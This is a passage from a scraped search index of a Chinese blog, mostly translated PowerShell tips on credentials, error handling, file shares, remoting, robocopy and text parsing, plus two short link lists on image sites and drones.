Windows PowerShell 5.1 Preview","link":"/2016/11/25/shed-light-into-the-powershell-version-jungle/"},{"title":"PowerShell 技能连载 - 用其他身份启动程序","text":"假设您想以不同的身份打开多个 PowerShell 控制台，或以其他人的身份打开任何程序。 要实现这个目标，您需要以其他人的身份登录，这很明显是个负担。以下是将凭据以安全的方式保存到文件的方法：密码采用您的身份和您的机器加密成密文。只有保存它们的那个人可以取回它，而且只能在保存该文件的机器上操作： 12# saving credential securely to fileGet-Credential | Export-Clixml -Path &quot;$home\\login.xml&quot; 这个凭据将保存到用户配置中。如果您希望保存到其它地方，请改变路径。喜欢保存多少份，就调用多少次该方法。 下一步，假设您加载了一个保存的凭据，并且使用该身份启动了一个程序： 1234# getting back saved credential$cred = Import-Clixml -Path &quot;$home\\login.xml&quot;# launch applicationStart-Process -FilePath powershell -Credential $cred -Work c:\\ -LoadUserProfile 这将以您之前指定的用户身份创建一个新的 PowerShell 实例——无需手动登录。","link":"/2016/11/28/launching-applications-as-someone-else/"},{"title":"PowerShell 技能连载 - 高级错误处理：重新抛出异常","text":"在处理错误时，您有时会希望将原始的异常替换成您自己的。以下是一个例子： 123456789101112131415161718192021function Do-Something{ # function uses internal error handling try { Get-Process -Name NotThereOhWell -ErrorAction Stop } # catch this error type catch [Microsoft.PowerShell.Commands.ProcessCommandException] { $oldE = $_.Exception # handle the error, OR SHOWN HERE: issue a new exception to the caller $newE = New-Object -TypeName System.InvalidOperationException('Do-Something: A fatal error occured', $oldE) Throw $newE }}# function will encounter an internal error# error message shows error message generated by function insteadDo-Something 调用者看到的内容如下： 1234567PS C:\\&gt; Do-SomethingDo-Something: A fatal error occuredAt line:18 char:5+ Throw $newException+ ~~~~~~~~~~~~~~~~~~~ + CategoryInfo : OperationStopped: (:) [], InvalidOperationException + FullyQualifiedErrorId : Do-Something: A fatal error occured 如果调用者也用一个错误处理函数来接收它，则会出现这种情况： 1234567891011try{ Do-Something}catch [System.InvalidOperationException]{ [PSCustomObject]@{ Message = $_.Exception.Message Originalmessage = $_.Exception.InnerException.Message }} 结果看起来如下： 12345Message Originalmessage------- ---------------Do-Something: A fatal error occured Cannot find a process with the name &quot;NotThereOhWell&quot;. Verify the process name and call the cmdlet again. 这样调用者可以看到返回的错误信息，并且经过内部处理之后，还可以传递原始的错误信息。","link":"/2016/11/29/advanced-error-handling-rethrowing-exceptions/"},{"title":"PowerShell 技能连载 - 捕获 Native EXE 的错误","text":"是否想知道如何捕获 native 控制台 EXE 程序的错误？PowerShell 的错误处理器只能处理 .NET 代码的错误。 这段代码是捕获控制台应用程序错误的框架： 123456789101112131415161718192021222324try{ # set the preference to STOP $old = $ErrorActionPreference $ErrorActionPreference = 'Stop' # RUN THE CONSOLE EXE THAT MIGHT EMIT AN ERROR, # and redirect the error channel #2 to the # output channel #1 net user doesnotexist 2&gt;&amp;1}catch [System.Management.Automation.RemoteException]{ # catch the error emitted by the EXE, # and do what you want $errmsg = $_.Exception.Message Write-Warning $errmsg}finally{ # reset the erroractionpreference to what it was before $ErrorActionPreference = $old} 一旦控制台程序发出一个错误，它就会输出到控制台的 #2 通道。由于示例代码中该通道直接重定向到普通的 output，所以 PowerShell 能接收到它。当 ErrorActionPreference 设成 “Stop“ 时，PowerShell 会将任何该通道的输入数据转发到一个 .NET RemoteException，这样您就可以捕获它。 1WARNING: The user name could not be found.","link":"/2016/11/30/catching-errors-from-native-exes/"},{"title":"PowerShell 技能连载 - 使用自定义域","text":"当您改变变量时，您可能需要在稍后清除它们并且确保它们回退到缺省值——用自定义作用域就可以做到。昨天，我们学习了如何处理控制台程序的错误。并且回顾那段代码，您会发现重置 $ErrorActionPreference 系统变量要费很多事： 123456789101112131415161718192021222324try{ # set the preference to STOP $old = $ErrorActionPreference $ErrorActionPreference = 'Stop' # RUN THE CONSOLE EXE THAT MIGHT EMIT AN ERROR, # and redirect the error channel #2 to the # output channel #1 net user doesnotexist 2&gt;&amp;1}catch [System.Management.Automation.RemoteException]{ # catch the error emitted by the EXE, # and do what you want $errmsg = $_.Exception.Message Write-Warning $errmsg}finally{ # reset the erroractionpreference to what it was before $ErrorActionPreference = $old} 一个简单得多的办法是使用自定义作用域： 12345678910111213141516171819&amp; { try { # set the preference to STOP $ErrorActionPreference = 'Stop' # RUN THE CONSOLE EXE THAT MIGHT EMIT AN ERROR, # and redirect the error channel #2 to the # output channel #1 net user doesnotexist 2&gt;&amp;1 } catch [System.Management.Automation.RemoteException] { # catch the error emitted by the EXE, # and do what you want: $errmsg = $_.Exception.Message Write-Warning $errmsg }} ${[code]} 这段代码创建了一个新的作用域，并且任何在其中定义的变量都会在退出该作用域时删除。这是为何在上述例子中，$ErrorActionPreference 能够自动还原为它之前的值。","link":"/2016/12/01/using-custom-scopes/"},{"title":"PowerShell 技能连载 - 使用自定义作用域来屏蔽任何输出","text":"昨天我们看了自定义作用域能够自动还原变量并在您的代码之后清除现场。 自定义作用域也可以用来忽略域里任何一段代码输出的任何结果。要实现它，请使用这样的解构：$null = .{[code]}。无论您在方括号里执行什么代码，您创建的所有的变量和函数在域外都能使用，但是不会产生任何输出。 让我们看看这个函数： 1234567function Out-Voice ($Text){ $sapi = New-Object -ComObject Sapi.SpVoice $sapi.Speak($Text)}Out-Voice -Text 'Hello, Dude.' 当你运行它时，它将能播放语音，但也输出了数字“1”。所以 Speak() 方法会造成这样的现象——当您的代码变得庞大而复杂时，有许多地方在输出不必要的数字。 以下是一个极简单的“补丁”函数能产生相同的小郭，但是保证不会返回任何值： 123456789function Out-Voice ($Text){ $null = . { $sapi = New-Object -ComObject Sapi.SpVoice $sapi.Speak($Text) }}Out-Voice -Text 'Hello, Dude.'","link":"/2016/12/02/using-custom-scopes-to-discard-any-output/"},{"title":"PowerShell 技能连载 - 创建文件共享","text":"在 Server 2012 R2 和 Windows .1 中，有许多有用的新模块，包含了许多新的 cmdlet，例如 New-SmbShare 可以快速地创建新的文件共享。 如果您没有这些 cmdlet，您通常可以使用 WMI。那需要更多的研究和搜索，但是一旦您有了一个代码模板，它就能很好地工作了。 例如要以管理员身份创建一个新的文件共享，试试以下代码： 1234567$share = [wmiclass]&quot;Win32_Share&quot;$path = 'c:\\logs'$name = 'LogShare'$maxallowed = 10$description = 'Place log files here'$share.Create( $path, $name, 0, $maxallowed,$description,$null,$null)","link":"/2016/12/05/creating-file-shares/"},{"title":"PowerShell 技能连载 - 同时使用 -Force 和 -WhatIf 时请注意","text":"-WhatIf 通用参数可以打开模拟模式，这样一个 cmdlet 执行的时候并不会改变任何东西，而是汇报它“将会”改变什么。它能工作得很好， 除非开发者没有正确地实现 -WhatIf。 有一种比较少见的情况：当您同时指定了 -Force 和 -WhatIf 参数，正确的结果是 -WhatIf 具有更高的优先级。有一些开发者过于关注 -Force 的功能，而让 -Force 优先级更高。例如请试试 Remove-SmbShare。","link":"/2016/12/06/watch-out-when-combining-force-and-whatif/"},{"title":"PowerShell 技能连载 - 安全地对文本加解密","text":"当您加密保密信息时，主要的问题是要寻找一个合适的密钥。一个特别安全的密钥是您的 Windows 身份，它和您的计算机身份绑定。这可以用来在特定的机器上加密敏感的个人信息。 以两个函数演示了如何实现： 123456789101112131415161718192021222324252627282930313233343536function Decrypt-Text{ param ( [String] [Parameter(Mandatory,ValueFromPipeline)] $EncryptedText ) process { $secureString = $EncryptedText | ConvertTo-SecureString $BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString) [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR) }}function Encrypt-Text{ param ( [String] [Parameter(Mandatory,ValueFromPipeline)] $Text ) process { $Text | ConvertTo-SecureString -AsPlainText -Force | ConvertFrom-SecureString }}'PowerShell Rocks' | Encrypt-Text'Hello, World!' | Encrypt-Text | Decrypt-Text 您可以将密文安全地保存到文件里。只有您可以读取并解密该文件，而且只能在加密用的电脑上完成。","link":"/2016/12/07/safely-encrypting-and-decrypting-text/"},{"title":"PowerShell 技能连载 - 最常用的动词","text":"让我们来看看您的 PowerShell 中哪个命令动词是最常用的： 123Get-Command -CommandType cmdlet, function |Group-Object -Property Verb |Sort-Object -Property Count -Descending 这是我们系统的输出结果： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798Count Name Group----- ---- ----- 456 Get {Get-AppBackgroundTask, Get-AppvVirtualProcess... 210 Set {Set-AssignedAccess, Set-AutologgerConfig, Set... 120 Remove {Remove-AutologgerConfig, Remove-BCDataCacheEx... 102 New {New-AutologgerConfig, New-DAEntryPointTableIt... 72 Enable {Enable-BCDistributed, Enable-BCDowngrading, E... 70 {A:, ABC, AfterAll, AfterAll...} 67 Add {Add-BCDataCacheExtension, Add-BitLockerKeyPro... 65 Disable {Disable-BC, Disable-BCDowngrading, Disable-BC... 28 Start {Start-Animation, Start-AppBackgroundTask, Sta... 26 Update {Update-Disk, Update-DscConfiguration, Update-... 24 Clear {Clear-AssignedAccess, Clear-BCCache, Clear-Bi... 22 Export {Export-Application, Export-BCCachePackage, Ex... 22 Invoke {Invoke-AsWorkflow, Invoke-Background, Invoke-... 20 Import {Import-BCCachePackage, Import-BCSecretKey, Im... 19 Stop {Stop-DscConfiguration, Stop-Dtc, Stop-DtcTran... 19 Rename {Rename-DAEntryPointTableItem, Rename-MaskingS... 19 Test {Test-Ancestor, Test-Descendent, Test-Dtc, Tes... 16 Register {Register-ClusteredScheduledTask, Register-Dns... 15 ConvertTo {ConvertTo-DataTemplate, ConvertTo-GridLength,... 14 Write {Write-DtcTransactionsTraceSession, Write-Prin... 14 Show {Show-Clock, Show-Details, Show-NetFirewallRul... 14 Reset {Reset-BC, Reset-DAClientExperienceConfigurati... 13 Unregister {Unregister-AppBackgroundTask, Unregister-Clus... 11 Out {Out-GridViewVertical, Out-Notepad, Out-Voice,... 11 Copy {Copy-DependencyProperty, Copy-NetFirewallRule... 9 Send {Send-EtwTraceSession, Send-PSCONFConfirmation... 9 Find {Find-Command, Find-DscResource, Find-Module, ... 9 ConvertFrom {ConvertFrom-SddlString, ConvertFrom-TypeToScr... 7 Save {Save-Module, Save-NetGPO, Save-NetworkSwitchC... 7 Repair {Repair-FileIntegrity, Repair-VirtualDisk, Rep... 7 Debug {Debug-FileShare, Debug-MMAppPrelaunch, Debug-... 7 Format {Format-Hex, Format-Volume, Format-Custom, For... 6 Suspend {Suspend-BitLocker, Suspend-PrintJob, Suspend-... 6 Install {Install-Dtc, Install-ISEPreviewShortcut, Inst... 6 Publish {Publish-BCFileContent, Publish-BCWebContent, ... 6 Resume {Resume-BitLocker, Resume-PrintJob, Resume-Bit... 6 Move {Move-Control, Move-SmbWitnessClient, Move-App... 5 Restore {Restore-DscConfiguration, Restore-NetworkSwit... 5 Restart {Restart-NetAdapter, Restart-PcsvDevice, Resta... 5 Select {Select-Date, Select-UIType, Select-Object, Se... 5 Mount {Mount-DiskImage, Mount-AppvClientConnectionGr... 4 Uninstall {Uninstall-Dtc, Uninstall-Module, Uninstall-Sc... 4 Disconnect {Disconnect-IscsiTarget, Disconnect-VirtualDis... 4 Connect {Connect-IscsiTarget, Connect-VirtualDisk, Con... 4 Receive {Receive-DtcDiagnosticTransaction, Receive-Job... 4 Unblock {Unblock-FileShareAccess, Unblock-SmbShareAcce... 4 Assert {Assert-MockCalled, Assert-MockCalled, Assert-... 4 Wait {Wait-Debugger, Wait-Event, Wait-Job, Wait-Pro... 3 Complete {Complete-BitsTransfer, Complete-DtcDiagnostic... 3 Resize {Resize-Partition, Resize-StorageTier, Resize-... 3 Optimize {Optimize-StoragePool, Optimize-Volume, Optimi... 3 Initialize {Initialize-Disk, Initialize-EventHandler, Ini... 3 Expand {Expand-Archive, Expand-WindowsCustomDataImage... 3 Dismount {Dismount-DiskImage, Dismount-AppxVolume, Dism... 3 Close {Close-Control, Close-SmbOpenFile, Close-SmbSe... 3 Convert {Convert-Alias, Convert-Path, Convert-String} 2 Use {Use-Transaction, Use-WindowsUnattend} 2 Undo {Undo-DtcDiagnosticTransaction, Undo-Transaction} 2 Trace {Trace-Command, Trace-SteroidsOutput} 2 Split {Split-Path, Split-WindowsImage} 2 Resolve {Resolve-DnsName, Resolve-Path} 2 Measure {Measure-Command, Measure-Object} 2 Join {Join-DtcDiagnosticResourceManager, Join-Path} 2 Exit {Exit-PSHostProcess, Exit-PSSession} 2 Read {Read-PrinterNfcTag, Read-Host} 2 Block {Block-FileShareAccess, Block-SmbShareAccess} 2 Enter {Enter-PSHostProcess, Enter-PSSession} 2 Revoke {Revoke-FileShareAccess, Revoke-SmbShareAccess} 2 Do {Do-Something, Do-SomethingWeird} 2 Sync {Sync-NetIPsecRule, Sync-AppvPublishingServer} 2 Edit {Edit-StringList, Edit-CIPolicyRule} 2 Hide {Hide-UIElement, Hide-VirtualDisk} 2 Grant {Grant-FileShareAccess, Grant-SmbShareAccess} 1 Unlock {Unlock-BitLocker} 1 Unpublish {Unpublish-AppvClientPackage} 1 Unprotect {Unprotect-CmsMessage} 1 Open {Open-NetGPO} 1 Lock {Lock-BitLocker} 1 Tee {Tee-Object} 1 Switch {Switch-Certificate} 1 Sort {Sort-Object} 1 Backup {Backup-BitLockerKeyProtector} 1 Protect {Protect-CmsMessage} 1 Compress {Compress-Archive} 1 Pop {Pop-Location} 1 Merge {Merge-CIPolicy} 1 Encrypt {Encrypt-Text} 1 Limit {Limit-EventLog} 1 Group {Group-Object} 1 ForEach {ForEach-Object} 1 Confirm {Confirm-SecureBootUEFI} 1 Decrypt {Decrypt-Text} 1 Compare {Compare-Object} 1 Checkpoint {Checkpoint-Computer} 1 Push {Push-Location} 1 Where {Where-Object} 更有趣的是，以下是 PowerShell cmdlet 前六个最常用的动词： 1234567891011121314PS C:\\&gt; Get-Command -CommandType cmdlet, function |Group-Object -Property Verb |Sort-Object -Property Count -Descending |Where-Object { $_.Name } |Select-Object -First 6 -Property Count, NameCount Name----- ---- 456 Get 210 Set 120 Remove 102 New 72 Enable 67 Add 所以说这头六个动词只占动词总数的 6%，但是占了所有命令的 60% 以上。","link":"/2016/12/08/most-popular-verbs/"},{"title":"PowerShell 技能连载 - 查找不合规的命令动词","text":"Cmdlet 和函数只能用认可的动词以便于用户查找命令，并且保持一致性。 以下是一个快速的审计代码，能够显示不符合这个规定的所有命令： 1234$approved = Get-Verb | Select-Object -ExpandProperty VerbGet-Command -CommandType Cmdlet, Function | Where-Object { $approved -notcontains $_.Verb } 这里返回的是所有不符合规定或根本没有命令动词的 cmdlet 和函数。","link":"/2016/12/09/finding-unapproved-verbs/"},{"title":"PowerShell 技能连载 - 分析结果出现次数（不浪费内存）","text":"用 Group-Object 可以基于共享的属性值对对象分组，但请不要忘记使用 -NoElement 参数来忽略实际的对象而只返回出现次数。 这行简单的代码告诉您指定文件夹中有哪些文件类型： 1Get-ChildItem -Path c:\\Windows -File | Group-Object -Property Extension -NoElement 结果看起来如下： 12345678Count Name----- ---- 11 .exe 1 .dat 9 .log 4 .xml 1 .txt... 指定了 -NoElement 之后，您可以节约相当客观的内存，因为原对象不再包括在结果中。","link":"/2016/12/12/analyzing-result-frequencies-without-wasting-memory/"},{"title":"PowerShell 技能连载 - 按属性值分割结果","text":"如果您使用 PowerShell 远程操作来接收远程机器的信息，您可以指定多个计算机名（扇出）。PowerShell 会自动逐台访问所有的机器，这样可以节省很多时间（当然，这些操作的前提是设置并启用了 PowerShell，这里不再赘述）。 返回的结果顺序是随机的，因为所有被访问的机器都会在它们准备好数据的时候返回各自的信息。 要将结果数据按每台机器分割，请使用 Group-Object 命令： 123456789101112131415161718$pc1 = $env:computername$pc2 = '192.168.2.112'$code ={ Get-Service | Where-Object Status -eq Running}# get all results$result = Invoke-Command -ScriptBlock $code -ComputerName $pc1, $pc2# separate per computer$groups = $result | Group-Object -Property PSComputerName -AsHashTable$groups# access per computer results separately$groups.$pc1$groups.$pc2 当您指定了 -AsHashTable 参数时，Groutp-Object 创建了一个以计算机名为键的哈希表。通过这种方法，您可以并发执行操作以节约时间，并仍然按每台机器来区分数据。","link":"/2016/12/13/separating-results-by-property-value/"},{"title":"PowerShell 技能连载 - 对启用 PIN 的用户使用 PowerShell Remoting","text":"如果您设置了 PIN 用来登录您的电脑，对您自己的机器使用 PowerShell remoting 可能会失败，提示如下奇怪的错误信息： 12345678910111213141516PS C:\\&gt; Invoke-Command { &quot;Hello&quot; } -ComputerName $env:computername[DESKTOP-7AAMJLF] Connecting to remote server DESKTOP-7AAMJLF failed with the following error message : WinRM cannot process the request. The following error with errorcode 0x8009030e occurred while using Negotiate authentication: A specified logon session does not exist. It may already have been terminated. Possible causes are: -The user name or password specified are invalid. -Kerberos is used when no authentication method and no user name are specified. -Kerberos accepts domain user names, but not local user names. -The Service Principal Name (SPN) for the remote computer name and port does not exist. -The client and remote computers are in different domains and there is no trust between the two domains. After checking for the above issues, try the following: -Check the Event Viewer for events related to authentication. -Change the authentication method; add the destination computer to the WinRM TrustedHosts configuration setting or use HTTPS transport. Note that computers in the TrustedHosts list might not be authenticated. -For more information about WinRM configuration, run the following command: winrm help config. For more information, see theabout_Remote_Troubleshooting Help topic. + CategoryInfo : OpenError: (DESKTOP-7AAMJLF:String) [], PSRemotingTransportException + FullyQualifiedErrorId : 1312,PSSessionStateBroken 要解决这个问题，您可以有两个选择： 设置一个使用密码的用户账户（需要本地管理员权限）。然后，运行 Invoke-Command 的时候使用 -Credential 参数，然后指定账户和密码。 如果您的电脑没有加入域，那么您需要启用 Negotiate 认证来进行 PowerShell remoting 操作。，并且使用机器的 IP 地址而不是计算机名。","link":"/2016/12/14/using-powershell-remoting-with-pin-enabled-accounts/"},{"title":"图片网站集合","text":"综合 Google 图片 百度图片 必应图像 专业 花瓣 Pinterest Shutterstock 含优秀图标 图标 图标搜索引擎 - findicons Iconfinder IcoMoon App","link":"/2016/12/15/picture-site-collection/"},{"title":"PowerShell 技能连载 - 等待进程退出","text":"有时候，一个 PowerShell 脚本需要等待外部进程结束。以下是一些用户的做法： 12345$processNameToWaitForExit = 'notepad'do{ Start-Sleep -Seconds 1} while (Get-Process -Name $processNameToWaitForExit -ErrorAction SilentlyContinue) 这种做法不太理想，因为它至少等待了一秒钟，即便进程已经不在运行了。以下是一个更好的方法： 12$processNameToWaitForExit = 'notepad'Wait-Process -Name $processNameToWaitForExit -ErrorAction SilentlyContinue 不仅代码更短，Wait-Process 也支持超时时间。如果等待的时间过长，您可以通过超时时间来结束等待。","link":"/2016/12/15/waiting-for-processes-to-exit/"},{"title":"PowerShell 技能连载 - 创建 Time Span","text":"您可以用 New-TimeSpan 来定义时间的“量”，然后对某个日期增加或减少这个量。以下是一个例子： 12345$1Day = New-TimeSpan -Days 1$today = Get-Date$yesterday = $today - $1Day$yesterday 更简单的办法是使用 DateTime 对象的内置方法： 1234$today = Get-Date$yesterday = $today.AddDays(-1)$yesterday 您也可以使用 TimeSpan .NET 类来创建 time span 对象： 1234567891011121314PS C:\\&gt; [Timespan]::FromDays(1)​Days : 1Hours : 0Minutes : 0Seconds : 0Milliseconds : 0Ticks : 864000000000TotalDays : 1TotalHours : 24TotalMinutes : 1440TotalSeconds : 86400TotalMilliseconds : 86400000","link":"/2016/12/16/creating-time-spans1/"},{"title":"Drone Resources","text":"DJI 大疆 DJI Developer DJI PC Simulator Installer &amp; User Manual 【新手必看】DJI 官方教程、网友经验分享合集（更新于11.22) 3rd Party 第三方 Altizure 用无人机创建三维世界 玩出新高度，Altizure 手把手教你航拍三维建模-Altizure-大不六文章网(wtoutiao.com) Aerial Photography 航拍 电影，纪录片，真人秀，分别该如何航拍？ - 乔岩的回答 - 知乎","link":"/2016/12/19/Drone-Resources/"},{"title":"PowerShell 技能连载 - 系统内存、单位和四舍五入","text":"有些时候，您可能会需要不同的度量单位。例如整个系统的内存是以字节计算的。以下是一些将字节转换为 GB 并且仍然保证可读性的例子： 123456789101112131415$memory = Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty TotalPhysicalMemory$memoryGB = $memory/1GB# raw result in bytes$memoryGB# rounding[Int]$memoryGB[Math]::Round($memoryGB)[Math]::Round($memoryGB, 1)# string formatting'{0:n1} GB' -f $memoryGB 结果看起来类似如下： 15.8744087219238 16 16 15.9 15.9 GB","link":"/2016/12/19/system-memory-units-and-rounding/"},{"title":"PowerShell 技能连载 - 检测文件或文件夹","text":"Test-Path 可以检测一个文件或文件夹是否存在。如果您添加了 -PathType 来指定叶子节点（文件），或 -Container（文件夹），结果会更具体： $path = 'c:\\windows' Test-Path -Path $path Test-Path -Path $path -PathType Leaf Test-Path -Path $path -PathType Container","link":"/2016/12/20/test-for-file-or-folder/"},{"title":"PowerShell 技能连载 - 捕获 Linux 输出","text":"如果您在 Linux 上运行 PowerShell，您可以混合使用 Linux 命令和 PowerShell 命令。要将 Linux 命令的输出赋值给 PowerShell 变量，请像这样写： 1$content = (ls) 请注意“ls”在 Windows 系统上是一个别名，但在 Linux 系统上指向的是原始的 ls 命令。","link":"/2016/12/21/capturing-linux-output/"},{"title":"PowerShell 技能连载 - 使用“Exit”和 Linux 通信","text":"当一个 PowerShell 脚本结束时，您可以使用“Exit”命令来返回一个数值。这在 Windows 世界中是一个很好的实践。它能够设置“Error Level”值，并能够被调用者（例如一个批处理文件或是定时任务管理器）读取到。 1exit 99 既然 PowerShell 在 Linux 上也可以运行，它也可以用来报告调用 Linux 进程的状态值。","link":"/2016/12/22/using-exit-to-communicate-with-linux/"},{"title":"PowerShell 技能连载 - 在 PowerShell 中创建 WinForms GUI 界面","text":"虽然建议使用更现代的 WPF 技术来创建 PowerShell 用户界面，但您在某些时候仍然会希望使用更早的 WinForms 技术。特别是要在没有安装 .NET framework 3.51 及以上版本的机器上运行时。WinForms 用户界面需要很多代码，而且不是那么直观。 所以这里提供一个免费的 PowerShell 在线图形设计器，可以快速地创建代码： http://www.poshgui.com/","link":"/2016/12/23/creating-winforms-guis-in-powershell/"},{"title":"PowerShell 技能连载 - 复制着色过的代码","text":"当您在 PowerShell ISE 中选中一段代码并复制到剪贴板时，它是以 RTF 格式复制的并且保留了所有颜色代码和字体信息。您可以将它粘贴到支持 RTF 的应用程序，例如 Word 中，就可以看到格式化并着色好的 PowerShell 代码。 要调节字体大小，您不能用 PowerShell ISE 右下角的滑块。这个滑块只是改变 PowerShell ISE 中的字体大小，并不会影响复制的代码字体大小。 正确的方法是，在 PowerShell ISE 中，选择工具/选项，然后在选项对话框中调节字体大小。","link":"/2016/12/26/copy-color-coded-code/"},{"title":"PowerShell 技能连载 - 扩展 Robocopy","text":"PowerShell 可以向原有的命令（例如 robocopy）添加值。请看以下的函数——它用 robocopy 来拷贝文件，并且当拷贝完成时，增加了“扁平拷贝”选项来打开目标文件夹： 12345678910111213141516171819202122232425262728293031323334353637383940414243#requires -Version 3.0function Copy-FileWithRobocopy{ param ( [Parameter(Mandatory)] [string]$Source, [Parameter(Mandatory)] [string]$Destination, [string]$Filter = '*', [int]$RetryCount = 0, [string]$ExcludeDirectory = '', [switch]$Open, [switch]$FlatCopy, [switch]$NoRecurse ) $Recurse = '/S' if ($NoRecurse) { $Recurse = '' } robocopy.exe $Source $Destination $Filter /R:$RetryCount $Recurse /XD $ExcludeDirectory if ($FlatCopy) { Get-ChildItem -Path $Destination -Recurse -Filter $Filter | Move-Item -Destination $Destination -Force Get-ChildItem -Path $Destination -Directory | Remove-Item -Recurse -Force } if ($Open) { explorer $Destination }} 这将会把 Windows 文件夹下所有子文件夹中的 log 文件拷贝到名为 c:\\\\logs 的新文件夹，并且执行扁平化拷贝： 1PS&gt; Copy-FileWithRobocopy -Source $env:windir -Destination c:\\logs -Filter *.log -FlatCopy -Open 当您在生产系统使用这段代码之前，请观察 -FlatCopy 是如何工作的：它只是在目标文件夹中查找匹配指定的过滤器，然后将它们移到根目录，最后删除所有文件夹。 所以重复的文件将会被覆盖，而且如果目标文件夹的子文件夹中有其他数据，也会被删除。这是一个很简单的操作，适用于许多情况，但也有很多改进空间。","link":"/2016/12/27/extending-robocopy/"},{"title":"PowerShell 技能连载 - 创建简单的 UI","text":"函数和 cmdlet 参数是 PowerShell 提供的基础功能，这些文本界面可以轻松地转换成图形界面。 如果您想发送一条消息，您可以使用 Send-MailMessage 并通过文本参数的方式提交细节信息。或者，您可以创建一个图形界面，并将它命名为 Send-MailMessageUI： 12345678#requires -Version 3.0function Send-MailMessageUI{ Show-Command -Name Send-MailMessage}​Send-MailMessageUI 现在，您可以运行 Send-MailMessageUI，所有参数都将变成文本框和复选框。甚至不会脚本开发的人现在也能填写这个表单，然后点击“运行”来执行命令。","link":"/2016/12/28/creating-simple-uis/"},{"title":"PowerShell 技能连载 - 调整简单界面","text":"在前一个技能中您学到了如何使用 Show-Command 为基于文本的命令创建简单的 UI： 12345678#requires -Version 3.0function Send-MailMessageUI{ Show-Command -Name Send-MailMessage}Send-MailMessageUI 如果您想调整 UI 中显示的参数的个数，只需要编写您自己的函数即可。 在下面的例子中，Send-MailMessage 被包裹在一个自定义的函数中，并只暴露其中的某些属性，然后在内部初始化其它的属性（例如 SMTP 服务器和凭据）。 以下是一个非常简单的 email 发送函数，只显示发送 email 的文本框： 1234567891011121314151617181920212223242526272829303132333435363738394041#requires -Version 3.0function Send-MailMessageCustomized{ param ( [Parameter(Mandatory)] [string] $From, [Parameter(Mandatory)] [string] $To, [Parameter(Mandatory)] [string] $Subject, [Parameter(Mandatory)] [string] $building, [switch] $BodyAsHTML ) $username = 'mymailusername' $password = 'mymailpassword' # Dangerous, never hardcode! Consider using Get-Credential instead. $myServer = 'mail.mymailserver.mycompany.com' $passwordSecure = $password | ConvertTo-SecureString -AsPlainText -Force $myCred = New-Object -TypeName PSCredential($username, $passwordSecure) Send-MailMessage -From $From -To $To -Subject $Subject -building $building -BodyAsHtml:$BodyAsHTML -SmtpServer $myServer -Encoding UTF8 -Credential $myCred}function Send-MailMessageUI{ Show-Command -Name Send-MailMessageCustomized}Send-MailMessageUI","link":"/2016/12/29/adjusting-simple-uis/"},{"title":"PowerShell 技能连载 - 解析纯文本（第一部分）","text":"有些时候，您可能希望从纯文本结果中提取一些有用的信息。一个简单的办法是使用 Select-String 命令。这个例子只提取包含“IPv4”的文本行： 123PS C:\\&gt; ipconfig | Select-String 'IPv4' IPv4 Address. . . . . . . . . . . : 192.168.2.112 如果您只对实际的 IP 地址感兴趣，您可以改进这个结果，用正则表达式来提取您感兴趣的部分： 1234PS C:\\&gt; $data = ipconfig | select-string 'IPv4'PS C:\\&gt; [regex]::Matches($data,&quot;\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b&quot;) | Select-Object -ExpandProperty Value192.168.2.112 [Regex]::Matches() 输入原始数据和正则表达式 pattern，后者描述了您感兴趣的部分。符合该 pattern 的内容可以在“Value”属性中找到。","link":"/2016/12/30/parsing-raw-text-part-1/"},{"title":"PowerShell 技能连载 - 解析纯文本（第二部分）","text":"在前一个技能中我们解释了如何使用 Select-String 和正则表达式从纯文本结果中提取有用的信息： 1234PS C:\\&gt; $data = ipconfig | select-string 'IPv4'PS C:\\&gt; [regex]::Matches($data,&quot;\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b&quot;) | Select-Object -ExpandProperty Value192.168.2.112 PowerShell 支持 -match 参数，它也能够处理正则表达式。不过它在一行里只能找到一个匹配项。在多数场景中这也不是大问题，因为一行中通常只包含了一个匹配项。您所做的只需要在管道中使用 -match，则原始的数据会逐行地输入： 123456789PS C:\\&gt; ipconfig | # do raw filtering to only get lines with this word Where-Object { $_ -like '*IPv4*' } | # do RegEx filtering to identify the value matching the pattern Where-Object { $_ -match '\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b' } | # return the results from -match which show in $matches Foreach-Object { $matches[0] }192.168.2.112","link":"/2017/01/02/parsing-raw-text-part-2/"},{"title":"PowerShell 技能连载 - 解析纯文本（第三部分）","text":"在前一个技能中我们演示了如何用 Select-String 在纯文本中查找指定的词。费了一些功夫通过指定的 pattern 来提取实际的值： 1234PS C:\\&gt; $data = ipconfig | select-string 'IPv4'PS C:\\&gt; [regex]::Matches($data,&quot;\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b&quot;) | Select-Object -ExpandProperty Value192.168.2.112 不过这些功夫并不是必要的，因为 Select-String 已经在使用正则表达式来做匹配，然后返回匹配的对象。 1234567891011121314151617181920212223242526272829303132PS C:\\&gt; ipconfig | Select-String '\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b' | Select-Object -Property * IgnoreCase : True LineNumber : 16 Line : IPv4 Address. . . . . . . . . . . : 192.168.2.112 Filename : InputStream Path : InputStream Pattern : \\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b Context : Matches : {192.168.2.112} IgnoreCase : True LineNumber : 17 Line : Subnet Mask . . . . . . . . . . . : 255.255.255.0 Filename : InputStream Path : InputStream Pattern : \\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b Context : Matches : {255.255.255.0} IgnoreCase : True LineNumber : 19 Line : 192.168.2.1 Filename : InputStream Path : InputStream Pattern : \\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b Context : Matches : {192.168.2.1} 所以您可以简单地使用 Where-Object 和类似 -like 的操作符来预过滤，识别出只包含感兴趣内容的行（例如只包含 “IPV4” 的行），然后将一个正则表达式 pattern 传给 Select-String，并计算最终结果： 1234567891011PS C:\\&gt; ipconfig | # do raw prefiltering and get only lines containing this word Where-Object { $_ -like '*IPv4*' } | # do RegEx filtering using a pattern for IPv4 addresses Select-String '\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b' | # get the matching values Select-Object -ExpandProperty Matches | # get the value for each match Select-Object -ExpandProperty Value192.168.2.112","link":"/2017/01/03/parsing-raw-text-part-3/"},{"title":"PowerShell 技能连载 